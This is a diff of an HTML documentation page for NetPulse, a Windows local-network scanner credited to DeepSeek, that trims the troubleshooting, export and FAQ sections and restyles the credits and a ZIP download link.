+                        <h4>Example: Find Apple devices</h4>
+                        <p>Search: <code>apple</code></p>
+                    </div>
+                    <div class="feature-item">
+                        <div class="feature-icon">🔒</div>
+                        <h4>Example: Find SSH servers</h4>
+                        <p>Search: <code>22</code> or <code>ssh</code></p>
+                    </div>
                 </div>
-            </section>
-            
-            <!-- Export -->
-            <section id="export">
-                <h2>💾 Exporting Results</h2>
-                <p>Save your scan results to CSV format for documentation, analysis, or sharing.</p>
-                
-                <h3>How to Export:</h3>
-                <div class="card">
-                    <ol>
-                        <li>Complete a scan</li>
-                        <li>Click the <span class="badge green">💾 Export CSV</span> button</li>
-                        <li>Choose a save location and filename</li>
-                        <li>Click <strong>Save</strong></li>
-                    </ol>
-                </div>
-                
-                <h3>CSV File Contents:</h3>
-                <pre><code>IP Address, Hostname, MAC Address, Vendor, Open Ports, SNMP Name, Status
-"192.168.1.1", "router.local", "00:14:22:XX:XX:XX", "Cisco", "22/SSH, 80/HTTP", "Router", "Complete"
-"192.168.1.50", "desktop-pc", "00:1A:2B:XX:XX:XX", "Intel", "3389/RDP", "N/A", "Complete"
-"192.168.1.100", "printer", "00:25:9C:XX:XX:XX", "Apple", "515/LPD", "N/A", "Complete"</code></pre>
-                
-                <div class="card info">
-                    <strong>💡 Tip:</strong> CSV files can be opened in Excel, Google Sheets, or any text editor for further analysis.
-                </div>
-            </section>
-            
-            <!-- Troubleshooting -->
-            <section id="troubleshooting">
-                <h2>🔧 Troubleshooting</h2>
-                
-                <table>
-                    <tr>
-                        <th>Problem</th>
-                        <th>Solution</th>
-                    </tr>
-                    <tr>
-                        <td>No devices found</td>
-                        <td>• Run as Administrator<br>• Check your network connection<br>• Disable Windows Firewall temporarily<br>• Try pinging an IP manually</td>
-                    </tr>
-                    <tr>
-                        <td>MAC addresses show "Unavailable"</td>
-                        <td>• Run as Administrator<br>• ARP table may be empty - ping the device first<br>• Wait a few seconds and re-scan</td>
-                    </tr>
-                    <tr>
-                        <td>Vendors show "Unknown"</td>
-                        <td>• Click "Update OUI" button to download the database<br>• Check internet connection<br>• Some MACs may not be in the database</td>
-                    </tr>
-                    <tr>
-                        <td>Scan is very slow</td>
-                        <td>• Large subnets (e.g., /16) take longer<br>• Reduce concurrent threads in code<br>• Cancel and restart</td>
-                    </tr>
-                    <tr>
-                        <td>SNMP shows "N/A" for all devices</td>
-                        <td>• Normal - most home devices don't support SNMP<br>• Enterprise network equipment usually does</td>
-                    </tr>
-                    <tr>
-                        <td>Export CSV fails</td>
-                        <td>• Check write permissions to save location<br>• Try saving to Desktop or Documents<br>• Close the CSV file if already open</td>
-                    </tr>
-                    <tr>
-                        <td>App crashes on start</td>
-                        <td>• Make sure .NET 8.0 is installed<br>• Extract the ZIP completely (don't run from inside ZIP)<br>• Run as Administrator</td>
-                    </tr>
-                    <tr>
-                        <td>SSH/RDP won't open</td>
-                        <td>• Make sure the client is installed (Windows SSH is built-in)<br>• Check that the port is open on the target device</td>
-                    </tr>
-                </table>
             </section>
             
             <!-- FAQ -->
@@ -708,48 +768,38 @@
                 <h2>❓ Frequently Asked Questions</h2>
                 
                 <div class="card">
-                    <h4>Why do I need Administrator privileges?</h4>
-                    <p>MAC address detection uses the Windows ARP table, which requires elevated privileges to read. Without admin rights, MAC addresses will show as "Unavailable".</p>
+                    <h4>🔧 Why do I need Administrator privileges?</h4>
+                    <p>MAC address detection reads the Windows ARP table, which requires elevated privileges. The app still works without admin, but MAC addresses show as "Unavailable".</p>
                 </div>
                 
                 <div class="card">
-                    <h4>Is this tool safe to use on my network?</h4>
-                    <p>Yes! NetPulse only performs passive discovery (ICMP ping) and standard TCP connection attempts. It does not exploit vulnerabilities or attempt to hack devices. All connections you initiate (SSH, RDP) use standard Windows clients.</p>
+                    <h4>🛡️ Is this tool safe?</h4>
+                    <p>Yes! NetPulse only performs standard ICMP pings and TCP connection attempts. It does not exploit vulnerabilities or attempt to hack devices. All data stays on your computer.</p>
                 </div>
                 
                 <div class="card">
-                    <h4>Will my IT department detect this?</h4>
-                    <p>Yes - network scans generate ICMP and TCP traffic that can be logged by firewalls and IDS systems. Always get permission before scanning networks you don't own.</p>
+                    <h4>📊 How long does a scan take?</h4>
+                    <p>A full scan of a /24 subnet (254 IPs) takes 30-60 seconds depending on network speed and active devices.</p>
                 </div>
                 
                 <div class="card">
-                    <h4>Can I scan the entire Internet?</h4>
-                    <p>No - NetPulse is designed for local network scanning only. It automatically detects your local subnet and scans within that range.</p>
+                    <h4>🌐 Can I scan the internet?</h4>
+                    <p>No - NetPulse is designed for local network scanning only. It automatically detects your local subnet.</p>
                 </div>
                 
                 <div class="card">
-                    <h4>How often should I update the OUI database?</h4>
-                    <p>Click "Update OUI" once a month to keep vendor information current. The database downloads from IEEE's official source.</p>
+                    <h4>🔄 How often should I update OUI?</h4>
+                    <p>Click "Update OUI" once a month to keep vendor information current.</p>
                 </div>
                 
                 <div class="card">
-                    <h4>Can I add more ports to scan?</h4>
-                    <p>Yes - modify the <code>commonPorts</code> dictionary in <code>NetworkService.cs</code> and rebuild the project.</p>
+                    <h4>💻 Is there a portable version?</h4>
+                    <p>Yes! The app is completely portable - just extract and run. No installation required.</p>
                 </div>
                 
                 <div class="card">
-                    <h4>Does this work on Wi-Fi?</h4>
-                    <p>Yes - NetPulse works on both Ethernet and Wi-Fi networks.</p>
-                </div>
-                
-                <div class="card">
-                    <h4>Is there a portable version?</h4>
-                    <p>The application is already portable! Just extract the ZIP and run the EXE - no installation required.</p>
-                </div>
-                
-                <div class="card">
-                    <h4>Does it collect or send any data?</h4>
-                    <p>No - NetPulse runs completely offline. No data is sent anywhere. The only internet access is for updating the OUI database (optional).</p>
+                    <h4>🔒 Does it send my data anywhere?</h4>
+                    <p>No - NetPulse runs completely offline. The only internet access is for optional OUI database updates.</p>
                 </div>
             </section>
             
@@ -757,43 +807,27 @@
             <section id="credits">
                 <h2>👏 Credits</h2>
                 <div class="card success">
-                    <strong>NetPulse Network Scanner</strong><br>
-                    Created by: <strong>DeepSeek</strong><br>
-                    Prompted by: <strong>Greg Urbano</strong><br><br>
-                    <strong>Technologies Used:</strong><br>
-                    • WPF (.NET 8.0) - User Interface<br>
-                    • CommunityToolkit.Mvvm - MVVM infrastructure<br>
-                    • Lextm.SharpSnmpLib - SNMP protocol support<br>
-                    • IEEE OUI Database - MAC vendor lookup<br><br>
-                    <strong>License:</strong> Free for personal and commercial use<br><br>
-                    <strong>Download Link:</strong> <a href="https://files.catbox.moe/olh16d.zip" style="color: #89B4FA;">https://files.catbox.moe/olh16d.zip</a>
-                </div>
-            </section>
-            
-            <!-- System Requirements Summary -->
-            <section>
-                <h2>📋 System Requirements Summary</h2>
-                <div class="card">
-                    <ul>
-                        <li><strong>OS:</strong> Windows 10 or Windows 11 (64-bit)</li>
-                        <li><strong>Privileges:</strong> Administrator (for MAC detection)</li>
-                        <li><strong>Disk Space:</strong> ~150 MB (including OUI cache)</li>
-                        <li><strong>RAM:</strong> ~100 MB during scan</li>
-                        <li><strong>Network:</strong> Ethernet or Wi-Fi connection</li>
-                        <li><strong>Dependencies:</strong> .NET 8.0 (included)</li>
-                    </ul>
+                    <p style="font-size: 1.1rem; margin-bottom: 15px;"><strong>NetPulse Network Scanner v1.0.0</strong></p>
+                    <p>✨ <strong>Created by:</strong> DeepSeek</p>
+                    <p>📝 <strong>Prompted by:</strong> Greg Urbano</p>
+                    <p>🔧 <strong>Built with:</strong> WPF (.NET 8.0) + CommunityToolkit.Mvvm + SharpSnmpLib</p>
+                    <p>📚 <strong>OUI Database:</strong> IEEE Standards Association</p>
+                    <hr style="margin: 15px 0; border-color: #313244;">
+                    <p style="font-size: 0.9rem;">© 2024 - Free for personal and commercial use | Open Source</p>
                 </div>
             </section>
         </div>
         
         <!-- Footer -->
         <div class="footer">
-            <p><strong>NetPulse Network Scanner v1.0.0</strong> | Built with WPF .NET 8.0</p>
+            <div class="footer-links">
+                <a href="https://files.catbox.moe/olh16d.zip">📥 Download NetPulse</a>
+                <a href="#overview">📖 Documentation</a>
+                <a href="#faq">❓ FAQ</a>
+                <a href="#credits">👏 Credits</a>
+            </div>
+            <p>NetPulse Network Scanner v1.0.0 | Built with WPF .NET 8.0</p>
             <p>Created by <strong>DeepSeek</strong> | Prompted by <strong>Greg Urbano</strong></p>
-            <p>© 2024 - Free for personal and commercial use</p>
-            <p style="margin-top: 10px;">
-                <a href="https://files.catbox.moe/olh16d.zip" style="color: #89B4FA;">📥 Download NetPulse (62MB)</a>
-            </p>
         </div>
     </div>
 </body>
